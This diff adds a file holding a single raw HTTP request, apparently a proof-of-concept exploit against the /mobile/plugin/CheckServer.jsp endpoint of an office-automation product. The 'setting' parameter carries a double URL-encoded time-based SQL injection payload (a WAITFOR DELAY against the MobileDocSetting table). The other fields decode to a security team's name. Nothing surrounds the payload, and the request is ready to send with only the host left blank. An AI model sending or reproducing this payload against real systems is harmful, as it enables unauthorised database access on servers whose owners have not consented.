@@ -1,0 +1,15 @@
+POST
+/mobile/plugin/CheckServer.jsp
+HTTP/1.1
+Host:
+ip
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 448
+timestamp=123&type=mobileSetting&settings=[{"scope":"2","module":"3","setting":"@%252
+7%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2527%2530%253a%253
+0%253a%2531%2530%2527%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256
+d%2520%254d%256f%2562%2569%256c%2565%2544%256f%2563%2553%2565%2574%2574%2569%256e%256
+7%2520%2577%2568%2565%2572%2565%2527%2527%253d%2527|1","modulename":"%E5%B1%B1%E6%B5%
+B7%E5%85%B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","include":"%E5%B1%B1%E6%B5%B7%E5%85%
+B3%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F","orasc":"%E5%B1%B1%E6%B5%B7%E5%85%B3%E5%AE%89
+%E5%85%A8%E5%9B%A2%E9%98%9F"}]
